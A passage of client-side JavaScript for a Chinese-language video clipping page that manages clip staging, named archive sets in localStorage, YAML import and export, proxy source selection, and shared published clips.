'use strict';
const STAGING_KEY_PREFIX = 'zcll.clips.staging.';
const ARCHIVE_KEY_PREFIX = 'zcll.clips.archive.';
const ORIGIN_KEY_PREFIX = 'zcll.clips.origin.';
const META_KEY_PREFIX = 'zcll.clips.meta.';
const $ = id => document.getElementById(id);

let filePath = '', fileKey = '', fileType = '';    // 'video' or 'audio'
let fileSize = 0;       // original's byte size, 0 when unknown
let proxies = [];       // available proxy records
let activeProxy = null; // currently selected proxy key (or null for original)
let identity = null;
// staging: a flat list of clips — the one working set.
// archive:  a list of named sets, `{id, name, description, createdAt, clips}`.
// stagingOrigin: the archive set staging was loaded from, so re-committing
// updates that set instead of leaving a near-duplicate beside it.
let staging = [], archive = [], stagingOrigin = null;
let pendingImportMeta = null;  // name/description carried in from an imported set document
const openSets = new Set();       // archive sets expanded in the UI, kept across re-renders
const openSharedSets = new Set(); // same, for published sets in the shared area
const publishing = new Set();     // set ids with a publish request in flight
let workspaceDirty = false;
let sharedSort = 'time';
let previewTimer = null;
let fileIsAudio = false; // the file itself is audio-only — fixed for the page
let isAudio = false;     // the *active source* is audio — changes on every switch

// DOM
const el = {
  filename: $('clip-filename'), video: $('preview-video'), previewArea: $('preview-area'),
  proxySelector: $('proxy-selector'), proxySelect: $('proxy-select'), previewNote: $('preview-note'),
  wsStart: $('ws-start'), wsEnd: $('ws-end'), wsHint: $('ws-hint'),
  stagingList: $('staging-list'), stagingCount: $('staging-count'),
  archiveList: $('archive-list'), archiveCount: $('archive-count'),
  archiveHeader: $('archive-header'), archiveBody: $('archive-body'),
  sharedList: $('shared-list'),
  identityModal: $('identity-modal'), identityNickname: $('identity-nickname'),
  identityAgree: $('identity-agree'), identityConfirm: $('btn-identity-confirm'),
  exportModal: $('export-modal'), exportTitle: $('export-title'), exportCmd: $('export-cmd'),
  quickDl: $('quick-dl'), quickBtn: $('btn-quick-dl'), quickNote: $('quick-note'),
  quickBar: $('quick-bar'), quickFill: $('quick-fill'), exportAdv: $('export-adv'),
  importModal: $('import-modal'), importText: $('import-text'), importError: $('import-error'),
  commitModal: $('commit-modal'), commitTitle: $('commit-title'), commitHint: $('commit-hint'),
  commitName: $('commit-name'), commitDesc: $('commit-desc'), commitError: $('commit-error'),
  commitAsNew: $('btn-commit-as-new'), stagingOriginNote: $('staging-origin'),
  sortTime: $('sort-time'), sortLikes: $('sort-likes'),
  stage: $('clip-stage'), togglePreview: $('btn-toggle-preview'),
  attachmentList: $('attachment-list'), attachmentCount: $('attachment-count'),
  skillCopy: $('btn-skill-copy'),
};

async function init() {
  const params = new URLSearchParams(location.search);
  filePath = params.get('file') || '';
  fileKey = params.get('key') || '';
  fileType = params.get('type') || 'video';
  // Optional. Absent when the page is opened by a hand-typed URL, in which
  // case the original ranks as unknown-and-largest — a proxy exists to be
  // smaller, so preferring one is the right default either way.
  fileSize = parseFloat(params.get('size') || '') || 0;

  if (!filePath || !fileKey) { el.filename.textContent = '❌ 缺少文件参数'; return; }
  const name = filePath.split('/').pop() || filePath;
  el.filename.textContent = (fileType === 'audio' ? '🎵 ' : '✂️ ') + name;
  el.filename.title = filePath;

  fileIsAudio = isAudio = (fileType === 'audio');
  loadLocalData();
  setupEvents();
  loadProxies();
  loadAttachments();
  renderAll();
  // Must finish before the shared list renders: renderShared decides the
  // "我的"/delete affordance from `identity`, and clicking ❤️ or 🚩 while it
  // is still null opens the identity dialog — confirming there used to mint
  // a second id and strand every clip this person already owned.
  await checkIdentity();
  loadSharedClips();
}

// ── Local data ──
function stagingKey() { return STAGING_KEY_PREFIX + filePath; }
function archiveKey() { return ARCHIVE_KEY_PREFIX + filePath; }
function originKey() { return ORIGIN_KEY_PREFIX + filePath; }
function metaKey() { return META_KEY_PREFIX + filePath; }
function loadLocalData() {
  try { staging = JSON.parse(localStorage.getItem(stagingKey()) || '[]'); } catch (_) { staging = []; }
  try { archive = JSON.parse(localStorage.getItem(archiveKey()) || '[]'); } catch (_) { archive = []; }
  try { stagingOrigin = localStorage.getItem(originKey()) || null; } catch (_) { stagingOrigin = null; }
  try { pendingImportMeta = JSON.parse(localStorage.getItem(metaKey()) || 'null'); } catch (_) { pendingImportMeta = null; }
  const migrated = migrateArchive(archive);
  const changed = migrated !== archive;
  archive = migrated;
  // The set staging came from may have been deleted in another tab.
  if (stagingOrigin && !archive.some(s => s.id === stagingOrigin)) stagingOrigin = null;
  // Persist the migration now. Without this a visit that only reads would
  // re-wrap the old shape next time under a fresh set id.
  if (changed) saveLocalData();
}
// Archive used to be a flat clip list, so anything already in localStorage
// from before this change has clips at the top level. Wrap it in one set
// rather than dropping it — the page is live, people have data in it.
function migrateArchive(list) {
  if (!Array.isArray(list) || !list.length) return Array.isArray(list) ? list : [];
  if (!Array.isArray(list[0] && list[0].clips)) {
    return [{ id: newId('a'), name: '旧归档', description: '升级前的归档片段。', createdAt: new Date().toISOString(), clips: list.filter(c => c && typeof c.startTime === 'number') }];
  }
  return list;
}
function saveLocalData() {
  try { localStorage.setItem(stagingKey(), JSON.stringify(staging)); } catch (_) {}
  try { localStorage.setItem(archiveKey(), JSON.stringify(archive)); } catch (_) {}
  try {
    if (stagingOrigin) localStorage.setItem(originKey(), stagingOrigin);
    else localStorage.removeItem(originKey());
    // Persisted too, so loading a shared set and then reloading the page
    // still prefills the commit dialog with the name it came in under.
    if (pendingImportMeta) localStorage.setItem(metaKey(), JSON.stringify(pendingImportMeta));
    else localStorage.removeItem(metaKey());
  } catch (_) {}
}
function newId(prefix) { return prefix + Date.now() + '-' + Math.random().toString(36).slice(2, 8); }

// ── Identity ──
async function checkIdentity() {
  try {
    const resp = await fetch('/api/identity/me');
    if (resp.ok) { const data = await resp.json(); identity = data.identity || null; }
  } catch (_) { identity = null; }
}
async function requestIdentity() {
  const nickname = el.identityNickname.value.trim();
  if (!nickname) return;
  el.identityConfirm.disabled = true; el.identityConfirm.textContent = '⏳ ...';
  try {
    const resp = await fetch('/api/identity', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({nickname}) });
    if (resp.ok) { const data = await resp.json(); identity = {id:data.id, nickname:data.nickname}; el.identityModal.hidden = true; }
    else alert('身份创建失败，请重试。');
  } catch (_) { alert('网络错误，请重试。'); }
  finally { el.identityConfirm.textContent = '确认'; updateIdentityBtn(); }
}
function closeIdentityModal() {
  el.identityModal.hidden = true;
  // Leave the nickname alone — a user who dismissed by accident should not
  // have to retype it — but drop the consent tick, so re-opening never
  // shows a pre-agreed checkbox the user never re-affirmed.
  el.identityAgree.checked = false;
  updateIdentityBtn();
}
function ensureIdentity() { if (!identity) { el.identityModal.hidden = false; el.identityNickname.focus(); return false; } return true; }

// ── Proxies ──
async function loadProxies() {
  try {
    const resp = await fetch('/api/proxy?file_path=' + encodeURIComponent(filePath));
    if (resp.ok) { const data = await resp.json(); proxies = data.proxies || []; }
  } catch (_) { proxies = []; }
  setupPlayer();
}

function setupPlayer() {
  const options = [{
    key: '', label: '📀 原片 (' + (fileIsAudio ? '音频' : '视频') + ')',
    type: fileType, size: fileSize,
  }];
  for (const p of proxies) {
    const typeStr = p.content_type && p.content_type.startsWith('audio/') ? 'audio' : 'video';
    const typeIcon = typeStr === 'audio' ? '🎵' : '🎬';
    options.push({ key: p.key, label: typeIcon + ' ' + (p.label || '代理'), type: typeStr, size: p.size || 0 });
  }

  if (options.length > 1) {
    el.proxySelector.hidden = false;
    // Built with DOM APIs, not innerHTML: the label is stored text and would
    // otherwise be parsed as markup on this public page.
    el.proxySelect.replaceChildren(...options.map((o, i) =>
      new Option(o.label + (o.size ? ' (' + formatSize(o.size) + ')' : ''), String(i))));
    el.proxySelect.onchange = () => switchSource(options[parseInt(el.proxySelect.value)]);
  } else {
    el.proxySelector.hidden = true;
  }

  const initial = smallestSource(options);
  el.proxySelect.value = String(options.indexOf(initial));
  switchSource(initial);
  updatePreviewNote(options, initial);
}

// Three things this line has to cover, in priority order: there is no proxy
// at all (the original is about to be dragged down), the smallest source has
// no picture (you cannot pick boundaries by ear), or nothing worth saying.
function updatePreviewNote(options, initial) {
  el.previewNote.replaceChildren();
  if (proxies.length === 0) {
    el.previewNote.hidden = false;
    el.previewNote.textContent = fileIsAudio
      ? '💡 音频文件可直接裁剪，无需代理。'
      : '⚠️ 该视频无代理文件，使用原片预览。原片较大，加载可能较慢。';
    return;
  }
  if (!fileIsAudio && initial.type === 'audio') {
    const alt = smallestVideoSource(options);
    el.previewNote.hidden = false;
    el.previewNote.append('🎵 已选择体积最小的纯音频代理预览，看不到画面。');
    if (alt) {
      // A button, not a hint: defaulting to sound-only is only acceptable
      // because getting the picture back is one tap away.
      const btn = document.createElement('button');
      btn.type = 'button';
      btn.className = 'note-switch';
      btn.textContent = '切换到画面（' + alt.label + '）';
      btn.addEventListener('click', () => {
        el.proxySelect.value = String(options.indexOf(alt));
        switchSource(alt);
        updatePreviewNote(options, alt);
      });
      el.previewNote.append(' ', btn);
    }
    return;
  }
  el.previewNote.hidden = true;
}

// Default to the lightest source, so the timeline scrubs quickly instead of
// dragging a 40 GB original through a phone connection.
//
// Smallest **overall**, audio-only proxies included. This used to exclude
// them for a video file, on the reasoning that opening in sound-only mode
// hides the picture you need to pick boundaries. That reasoning fails in
// the case it matters most: a file whose only proxy is audio-only fell back
// to the original, so uploading a 30 MB proxy left the page pulling the
// 40 GB source. Between "no picture" and "no playback at all", no picture
// wins — and `previewNote` says so with a one-click way to the video.
function smallestSource(options) {
  // A source with unknown size (0) ranks last: the original is the only one
  // that can lack a size, and it is the one thing a proxy is smaller than.
  return options.reduce((best, o) => {
    const a = o.size || Infinity, b = best.size || Infinity;
    return a < b ? o : best;
  }, options[0]);
}

// Smallest source that still has a picture, for the "看画面" escape hatch.
function smallestVideoSource(options) {
  const vids = options.filter(o => o.type === 'video');
  return vids.length ? smallestSource(vids) : null;
}

function switchSource(opt) {
  activeProxy = opt.key || null;
  const isNowAudio = opt.type === 'audio';
  const src = activeProxy
    ? '/api/file/' + encodePath(activeProxy)
    : '/api/file/' + encodePath(fileKey);

  // Swap between <video> and <audio> elements as needed. Sizing stays in
  // the stylesheet: an inline max-height here would outrank the responsive
  // rules and pin the player at desktop height on a phone.
  const currentEl = el.previewArea.querySelector('video, audio');
  if (isNowAudio && currentEl && currentEl.tagName === 'VIDEO') {
    const audio = document.createElement('audio');
    audio.id = 'preview-video'; // keep the same id for easy ref
    audio.controls = true;
    audio.preload = 'metadata';
    currentEl.replaceWith(audio);
    el.video = audio;
  } else if (!isNowAudio && currentEl && currentEl.tagName === 'AUDIO') {
    const video = document.createElement('video');
    video.id = 'preview-video';
    video.controls = true;
    video.playsInline = true;
    video.preload = 'metadata';
    currentEl.replaceWith(video);
    el.video = video;
  }
  el.video = el.previewArea.querySelector('video, audio');
  el.video.src = src;
  isAudio = isNowAudio;
}

// ── AI assist: the skill, and the admin's related files ──
//
// Both are inputs to the same workflow — hand them to an LLM, get a clip list
// back, paste it into 📥 导入 YAML. The skill is served from the repo's own
// SKILL.md (`/api/skill`), so what this page hands out cannot drift from what
// the README documents.
async function loadAttachments() {
  try {
    const resp = await fetch('/api/attachments?file_path=' + encodeURIComponent(filePath));
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    renderAttachments((await resp.json()).attachments || []);
  } catch (_) {
    el.attachmentList.replaceChildren(mkHint('关联文件加载失败。'));
  }
}

function mkHint(text) {
  const d = document.createElement('div');
  d.className = 'empty-hint';
  d.textContent = text;
  return d;
}

function renderAttachments(list) {
  el.attachmentCount.textContent = list.length ? '(' + list.length + ')' : '';
  if (!list.length) {
    el.attachmentList.replaceChildren(mkHint('该视频还没有字幕或文稿等关联文件。'));
    return;
  }
  // Built with DOM APIs: labels and filenames are free text, and this list is
  // rendered on a public page.
  el.attachmentList.replaceChildren(...list.map(a => {
    const name = a.filename || (a.key.split('/').pop() || '文件');
    const row = document.createElement('div');
    row.className = 'attachment-row';

    const meta = document.createElement('div');
    meta.className = 'attachment-meta';
    const label = document.createElement('span');
    label.className = 'attachment-label';
    label.textContent = a.label || '关联文件';
    const sub = document.createElement('span');
    sub.className = 'attachment-sub';
    sub.textContent = name + ' · ' + formatSize(a.size);
    sub.title = name;
    meta.append(label, sub);

    // A plain <a download>, not a fetch+blob: the bytes never enter the page,
    // so a 300 MB transcript bundle costs no memory, and the file keeps its
    // original encoding — .srt in the wild is routinely GBK or Shift-JIS, and
    // decoding it here as UTF-8 would hand over silent mojibake.
    const dl = document.createElement('a');
    dl.className = 'btn-ws';
    dl.href = '/api/file/' + encodePath(a.key) +
      '?download=1&name=' + encodeURIComponent(name);
    dl.download = name;
    dl.textContent = '⬇ 下载';

    row.append(meta, dl);
    return row;
  }));
}

async function copySkill() {
  const btn = el.skillCopy;
  const restore = () => { btn.textContent = '📋 复制 skill'; btn.disabled = false; };
  btn.disabled = true;
  btn.textContent = '⏳ ...';
  try {
    const resp = await fetch('/api/skill');
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    await navigator.clipboard.writeText(await resp.text());
    btn.textContent = '✅ 已复制!';
    setTimeout(restore, 2000);
  } catch (_) {
    // Clipboard access is refused outright in some embedded browsers. The
    // download button beside this one is the fallback, so just say so.
    btn.textContent = '❌ 复制失败';
    setTimeout(restore, 2000);
  }
}

// ── Events ──
function setupEvents() {
  el.skillCopy.addEventListener('click', copySkill);
  $('btn-set-start').addEventListener('click', () => setTimeFromMedia('start'));
  $('btn-set-end').addEventListener('click', () => setTimeFromMedia('end'));
  $('btn-preview-seg').addEventListener('click', previewSegment);
  $('btn-stage').addEventListener('click', stageCurrent);
  $('btn-clear-ws').addEventListener('click', clearWorkspace);
  // The stage is sticky, so on a phone the picture competes with the list
  // you are scrolling. Collapsing drops the video and keeps the time
  // controls pinned; playback is untouched, so audio keeps running.
  el.togglePreview.addEventListener('click', () => {
    const collapsed = el.stage.classList.toggle('collapsed');
    el.togglePreview.setAttribute('aria-expanded', String(!collapsed));
    el.togglePreview.title = collapsed ? '展开播放器' : '折叠播放器';
  });
  $('btn-commit-all').addEventListener('click', openCommitModal);
  $('btn-commit-confirm').addEventListener('click', () => commitStaging(false));
  el.commitAsNew.addEventListener('click', () => commitStaging(true));
  $('btn-close-commit').addEventListener('click', closeCommitModal);
  el.commitModal.addEventListener('click', e => { if (e.target === el.commitModal) closeCommitModal(); });
  $('btn-export-yaml').addEventListener('click', () => exportYAML(staging));
  $('btn-import-yaml').addEventListener('click', importYAML);
  $('btn-clear-staging').addEventListener('click', clearStaging);
  $('btn-export-archive').addEventListener('click', exportArchive);
  el.archiveHeader.addEventListener('click', toggleArchive);
  el.sortTime.addEventListener('click', () => { sharedSort = 'time'; loadSharedClips(); });
  el.sortLikes.addEventListener('click', () => { sharedSort = 'likes'; loadSharedClips(); });
  el.identityAgree.addEventListener('change', updateIdentityBtn);
  el.identityNickname.addEventListener('input', updateIdentityBtn);
  el.identityConfirm.addEventListener('click', requestIdentity);
  // The dialog is a prompt, not a gate: every caller (`ensureIdentity`) has
  // already bailed out by the time it opens, so dismissing it just leaves
  // `identity` null and the next ❤️/🚩/publish re-opens it.
  $('btn-identity-cancel').addEventListener('click', closeIdentityModal);
  el.identityModal.addEventListener('click', e => { if (e.target === el.identityModal) closeIdentityModal(); });
  $('btn-copy-cmd').addEventListener('click', copyExportCmd);
  $('btn-dl-full').addEventListener('click', downloadFullFile);
  el.quickBtn.addEventListener('click', runQuickDownload);
  $('btn-close-export').addEventListener('click', closeExportModal);
  el.exportModal.addEventListener('click', e => { if (e.target === el.exportModal) closeExportModal(); });
  $('btn-import-confirm').addEventListener('click', confirmImport);
  $('btn-import-archive').addEventListener('click', confirmImportArchive);
  $('btn-close-import').addEventListener('click', closeImportModal);
  el.importModal.addEventListener('click', e => { if (e.target === el.importModal) closeImportModal(); });
  el.wsStart.addEventListener('input', () => { workspaceDirty = true; });
  el.wsEnd.addEventListener('input', () => { workspaceDirty = true; });
  document.addEventListener('keydown', e => {
    // Escape first: the identity dialog focuses its nickname input on open,
    // so the INPUT guard below would swallow the key that closes it.
    if (e.key === 'Escape') {
      if (!el.identityModal.hidden) { closeIdentityModal(); return; }
      if (!el.commitModal.hidden) { closeCommitModal(); return; }
      if (!el.importModal.hidden) { closeImportModal(); return; }
      if (!el.exportModal.hidden) { closeExportModal(); return; }
    }
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
    // A click on any backdrop moves focus off the inputs, which would
    // otherwise let Space/[/] drive the player behind an open modal.
    if (!el.identityModal.hidden || !el.commitModal.hidden || !el.importModal.hidden || !el.exportModal.hidden) return;
    if (e.key === '[') setTimeFromMedia('start');
    if (e.key === ']') setTimeFromMedia('end');
    if (e.key === ' ' || e.code === 'Space') { e.preventDefault(); previewSegment(); }
  });
  window.addEventListener('beforeunload', e => {
    if (workspaceDirty || staging.length > 0) { e.preventDefault(); e.returnValue = ''; }
  });
}
function updateIdentityBtn() {
  el.identityConfirm.disabled = !el.identityAgree.checked || !el.identityNickname.value.trim();
}

// ── Time ──
function parseTime(s) {
  s = s.trim(); if (!s) return NaN;
  const parts = s.split(':');
  if (parts.length === 2) return parseInt(parts[0]) * 60 + parseFloat(parts[1]);
  if (parts.length === 3) return parseInt(parts[0]) * 3600 + parseInt(parts[1]) * 60 + parseFloat(parts[2]);
  return parseFloat(s);
}
function formatTime(seconds) {
  if (isNaN(seconds) || seconds < 0) return '0:00.0';
  const m = Math.floor(seconds / 60), s = (seconds % 60).toFixed(1);
  return m + ':' + (parseFloat(s) < 10 ? '0' : '') + s;
}
function formatSize(bytes) {
  if (!bytes) return '';
  const units = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.min(units.length - 1, Math.floor(Math.log(bytes) / Math.log(1024)));
  const v = bytes / Math.pow(1024, i);
  return v.toFixed(i > 0 ? 1 : 0) + ' ' + units[i];
}
function getWorkspaceTimes() {
  const start = parseTime(el.wsStart.value), end = parseTime(el.wsEnd.value);
  if (isNaN(start) || isNaN(end) || start >= end) return null;
  return { start, end };
}
function setTimeFromMedia(which) {
  const t = el.video.currentTime;
  if (which === 'start') el.wsStart.value = formatTime(t);
  else el.wsEnd.value = formatTime(t);
  workspaceDirty = true;
}
function setWorkspace(start, end) {
  if (workspaceDirty && !confirm('工作区有未保存的修改，是否覆盖？')) return;
  el.wsStart.value = formatTime(start); el.wsEnd.value = formatTime(end); workspaceDirty = false;
}
function clearWorkspace() { el.wsStart.value = ''; el.wsEnd.value = ''; workspaceDirty = false; el.wsHint.hidden = true; }

// ── Preview ──
function previewSegment() {
  const times = getWorkspaceTimes();
  if (!times) { el.wsHint.textContent = '⚠️ 请设置有效的开始和结束时间'; el.wsHint.hidden = false; return; }
  el.wsHint.hidden = true;
  if (previewTimer) clearTimeout(previewTimer);
  const vid = el.video;
  vid.currentTime = times.start;
  vid.play().catch(() => {});
  function checkEnd() { if (vid.currentTime >= times.end || vid.paused) { vid.pause(); previewTimer = null; return; } previewTimer = setTimeout(checkEnd, 100); }
  previewTimer = setTimeout(checkEnd, 100);
}

// ── Staging ──
function stageCurrent() {
  const times = getWorkspaceTimes();
  if (!times) { el.wsHint.textContent = '⚠️ 请设置有效的开始和结束时间'; el.wsHint.hidden = false; return; }
  el.wsHint.hidden = true;
  staging.push({ id:newId('s'), name:'片段 '+(staging.length+1), description:'', startTime:times.start, endTime:times.end });
  saveLocalData(); clearWorkspace(); renderStaging();
}
function renameClip(id, list) {
  const c = list.find(x => x.id === id); if (!c) return;
  const n = prompt('新名称:', c.name); if (n !== null && n.trim()) { c.name = n.trim(); saveLocalData(); renderAll(); }
}
function editDescription(id, list) {
  const c = list.find(x => x.id === id); if (!c) return;
  const d = prompt('描述:', c.description || ''); if (d !== null) { c.description = d.trim(); saveLocalData(); renderAll(); }
}
function deleteClip(id, list) { const i = list.findIndex(x => x.id === id); if (i !== -1) { list.splice(i, 1); saveLocalData(); renderAll(); } }
function clearStaging() {
  if (!staging.length) return;
  if (!confirm('确认清空暂存区？未归档的片段将丢失。')) return;
  staging = []; stagingOrigin = null; pendingImportMeta = null; saveLocalData(); renderAll();
}

// ── Commit: staging → a named archive set ──
// This is the step that makes 归档 mean something. Committing names the set
// and freezes it; editing happens by loading it back into 暂存.
function openCommitModal() {
  if (!staging.length) return;
  const origin = stagingOrigin ? archive.find(s => s.id === stagingOrigin) : null;
  el.commitError.hidden = true;
  el.commitTitle.textContent = origin ? '📦 更新归档' : '📦 归档暂存区';
  el.commitHint.textContent = origin
    ? '将用暂存区的 ' + staging.length + ' 个片段覆盖归档《' + (origin.name || '未命名') + '》。'
    : '为这组 ' + staging.length + ' 个片段起一个名字，保存为一个归档。';
  el.commitName.value = origin ? (origin.name || '') : (pendingImportMeta && pendingImportMeta.name) || stagedSetDefaultName();
  el.commitDesc.value = origin ? (origin.description || '') : (pendingImportMeta && pendingImportMeta.description) || '';
  el.commitAsNew.hidden = !origin;
  el.commitModal.hidden = false;
  el.commitName.focus(); el.commitName.select();
}
function stagedSetDefaultName() { return '归档 ' + (archive.length + 1); }
function closeCommitModal() { el.commitModal.hidden = true; }
function commitStaging(asNew) {
  const name = el.commitName.value.trim();
  if (!name) { el.commitError.textContent = '请填写归档名称。'; el.commitError.hidden = false; return; }
  const description = el.commitDesc.value.trim();
  const origin = (!asNew && stagingOrigin) ? archive.find(s => s.id === stagingOrigin) : null;
  if (origin) {
    origin.name = name; origin.description = description; origin.clips = staging.slice();
  } else {
    archive.push({ id: newId('a'), name, description, createdAt: new Date().toISOString(), clips: staging.slice() });
  }
  staging = []; stagingOrigin = null; pendingImportMeta = null;
  saveLocalData(); closeCommitModal(); renderAll();
  if (el.archiveBody.hidden) toggleArchive();
}

// ── Archive ──
function toggleArchive() { const h = el.archiveBody.hidden; el.archiveBody.hidden = !h; el.archiveHeader.classList.toggle('open', !h); }
function findSet(setId) { return archive.find(s => s.id === setId) || null; }
// Loads a whole set — the set is the unit of work. Picking one clip out of a
// set is what the 📥 button on each clip does, and that only touches the
// workspace times, leaving the archive intact.
function loadSetToStaging(setId) {
  const set = findSet(setId); if (!set) return;
  if (staging.length > 0 && !confirm('暂存区有 ' + staging.length + ' 个未归档的片段，载入《' + (set.name||'未命名') + '》将覆盖它们。继续？')) return;
  staging = (set.clips || []).map(c => Object.assign({}, c, { id: newId('s') }));
  stagingOrigin = set.id;
  saveLocalData(); renderAll();
}
function renameSet(setId) {
  const set = findSet(setId); if (!set) return;
  const n = prompt('归档名称:', set.name || ''); if (n === null || !n.trim()) return;
  set.name = n.trim(); saveLocalData(); renderAll();
}
function editSetDescription(setId) {
  const set = findSet(setId); if (!set) return;
  const d = prompt('归档描述:', set.description || ''); if (d === null) return;
  set.description = d.trim(); saveLocalData(); renderAll();
}
function deleteSet(setId) {
  const set = findSet(setId); if (!set) return;
  if (!confirm('删除归档《' + (set.name||'未命名') + '》及其 ' + (set.clips||[]).length + ' 个片段？此操作不可撤销。')) return;
  archive = archive.filter(s => s.id !== setId);
  if (stagingOrigin === setId) stagingOrigin = null;
  saveLocalData(); renderAll();
}

// ── YAML ──
function clipsToYAML(list) {
  return list.map(c => `- name: ${JSON.stringify(c.name)}\n  description: ${JSON.stringify(c.description||'')}\n  start_time: ${c.startTime}\n  end_time: ${c.endTime}`).join('\n');
}
function yamlToClips(text) {
  const clips = []; let cur = null;
  // The value is taken after the first ':', not at a fixed offset — hand-
  // written and AI-generated YAML does not reliably put exactly one space
  // there, and an offset that guesses wrong turns `start_time:5` into 0.
  const val = t => t.slice(t.indexOf(':') + 1).trim();
  const str = t => { const v = val(t); try { return JSON.parse(v); } catch (_) { return v; } };
  for (const line of text.split('\n')) {
    const t = line.trim();
    if (t.startsWith('- name:')) {
      if (cur) clips.push(cur);
      cur = { id:newId('i'), name:'', description:'', startTime:0, endTime:0 };
      cur.name = str(t);
    } else if (t.startsWith('description:') && cur) { cur.description = str(t);
    } else if (t.startsWith('start_time:') && cur) { cur.startTime = parseFloat(val(t)) || 0;
    } else if (t.startsWith('end_time:') && cur) { cur.endTime = parseFloat(val(t)) || 0; }
  }
  if (cur) clips.push(cur);
  return clips.filter(c => c.startTime < c.endTime);
}
// An archive set carries its own name and description. `archive_name:` is
// not one of the keys yamlToClips looks at, so a set document still parses
// as a plain clip list — importing one into 暂存 keeps working, and the
// header only adds meaning for anything that asks for it.
function setToYAML(set) {
  return 'archive_name: ' + JSON.stringify(set.name || '') + '\n'
       + 'archive_description: ' + JSON.stringify(set.description || '') + '\n'
       + clipsToYAML(set.clips || []);
}
function archiveToYAML(list) { return list.map(setToYAML).join('\n\n'); }
// Prefills the commit dialog when a set document is imported into staging,
// so an export → import round trip does not lose the set's name.
// Splits a document at each `archive_name:` line, so exporting the whole
// archive and importing it back restores the sets instead of flattening
// every clip into one staging list.
function yamlToArchiveSets(text) {
  const lines = text.split('\n');
  const blocks = []; let cur = [];
  for (const line of lines) {
    if (line.trim().startsWith('archive_name:')) { if (cur.length) blocks.push(cur); cur = []; }
    cur.push(line);
  }
  if (cur.length) blocks.push(cur);
  const sets = [];
  for (const b of blocks) {
    const body = b.join('\n');
    const clips = yamlToClips(body);
    if (!clips.length) continue;
    const meta = yamlArchiveMeta(body);
    sets.push({ id: newId('a'), name: meta.name || '未命名归档', description: meta.description || '',
                createdAt: new Date().toISOString(), clips });
  }
  return sets;
}
function yamlArchiveMeta(text) {
  const meta = {};
  for (const line of text.split('\n')) {
    const t = line.trim();
    const read = t => { const v = t.slice(t.indexOf(':') + 1).trim(); try { return JSON.parse(v); } catch (_) { return v; } };
    if (t.startsWith('archive_name:') && meta.name === undefined) meta.name = read(t);
    else if (t.startsWith('archive_description:') && meta.description === undefined) meta.description = read(t);
  }
  return meta;
}
function exportSet(setId) {
  const set = findSet(setId); if (!set) return;
  if (!(set.clips || []).length) { alert('该归档没有片段。'); return; }
  copyYAML(setToYAML(set), (set.clips || []).length);
}
function exportArchive() {
  if (!archive.length) { alert('归档区为空。'); return; }
  copyYAML(archiveToYAML(archive), archive.reduce((n, s) => n + (s.clips || []).length, 0));
}
function exportYAML(list) {
  if (!list.length) { alert('没有可导出的片段。'); return; }
  copyYAML(clipsToYAML(list), list.length);
}
function copyYAML(yaml, count) {
  navigator.clipboard.writeText(yaml).then(() => alert('已复制 '+count+' 个片段到剪贴板！'), () => {
    const ta = document.createElement('textarea'); ta.value = yaml;
    ta.style.cssText = 'position:fixed;top:10%;left:10%;width:80%;height:80%;z-index:99999;';
    document.body.appendChild(ta); ta.select(); setTimeout(() => ta.remove(), 30000);
  });
}
// A textarea, not `prompt()`: prompt is single-line and collapses the
// newlines out of a paste, so `yamlToClips` (which splits on '\n') saw one
// line and parsed nothing — every import silently failed.
function importYAML() {
  el.importError.hidden = true;
  el.importModal.hidden = false;
  el.importText.focus();
}
function closeImportModal() { el.importModal.hidden = true; }
function confirmImport() {
  const text = el.importText.value;
  if (!text.trim()) { showImportError('请先粘贴内容。'); return; }
  const clips = yamlToClips(text);
  if (!clips.length) { showImportError('未能解析任何有效片段。每段需以 "- name:" 开头，且 end_time 必须大于 start_time。'); return; }
  if (staging.length && !confirm('暂存区已有 '+staging.length+' 个片段，导入将追加 '+clips.length+' 个。继续？')) return;
  const meta = yamlArchiveMeta(text);
  staging.push(...clips);
  // An imported set document is not the archive set it was exported from, so
  // committing it must create a new one rather than overwrite whatever the
  // staging area happened to be linked to.
  if (meta.name) { stagingOrigin = null; pendingImportMeta = meta; }
  saveLocalData(); renderAll();
  el.importText.value = ''; closeImportModal();
}
function showImportError(msg) { el.importError.textContent = msg; el.importError.hidden = false; }
// The counterpart to 导出全部归档: many sets in, many sets out. Goes straight
// to 归档, bypassing 暂存, because staging is a single flat working set and
// could not hold more than one of them.
function confirmImportArchive() {
  const text = el.importText.value;
  if (!text.trim()) { showImportError('请先粘贴内容。'); return; }
  const sets = yamlToArchiveSets(text);
  if (!sets.length) { showImportError('未能解析任何归档。归档文档需要 "archive_name:" 表头，且至少包含一个有效片段。'); return; }
  const total = sets.reduce((n, s) => n + s.clips.length, 0);
  if (!confirm('将新增 ' + sets.length + ' 个归档，共 ' + total + ' 个片段。继续？')) return;
  archive.push(...sets);
  saveLocalData(); renderAll();
  el.importText.value = ''; closeImportModal();
  if (el.archiveBody.hidden) toggleArchive();
}

// ── Shared ──
// Two lists in one area: published 归档 (collections) first, then clips that
// were published on their own. `/api/clips` returns set members too, so the
// loose list filters on `set_id` — otherwise every member would appear twice.
async function loadSharedClips() {
  el.sharedList.innerHTML = '<div class="empty-hint">加载中...</div>';
  try {
    const q = 'file_path=' + encodeURIComponent(filePath) + '&sort=' + sharedSort;
    const [setResp, clipResp] = await Promise.all([
      fetch('/api/clip-sets?' + q + '&limit=50'),
      // `loose=1` is a server-side filter, not a client one: set members are
      // public clips too, so filtering a page capped at 100 would let one
      // large set push every ungrouped clip off the end of the list.
      fetch('/api/clips?' + q + '&loose=1&limit=100'),
    ]);
    if (!setResp.ok) throw new Error('HTTP '+setResp.status);
    if (!clipResp.ok) throw new Error('HTTP '+clipResp.status);
    const sets = (await setResp.json()).sets || [];
    const clips = (await clipResp.json()).clips || [];
    renderShared(sets, clips);
  } catch (err) { el.sharedList.innerHTML = '<div class="empty-hint">❌ 加载失败: '+err.message+'</div>'; }
  el.sortTime.classList.toggle('active', sharedSort === 'time');
  el.sortLikes.classList.toggle('active', sharedSort === 'likes');
}
function renderShared(sets, clips) {
  if (!sets.length && !clips.length) { el.sharedList.innerHTML = '<div class="empty-hint">暂无公开切片。成为第一个分享的人吧！</div>'; return; }
  const nodes = sets.map(renderSharedSet);
  if (sets.length && clips.length) {
    const sep = document.createElement('div'); sep.className = 'shared-sep'; sep.textContent = '单独发布的片段';
    nodes.push(sep);
  }
  nodes.push(...clips.map(renderSharedClip));
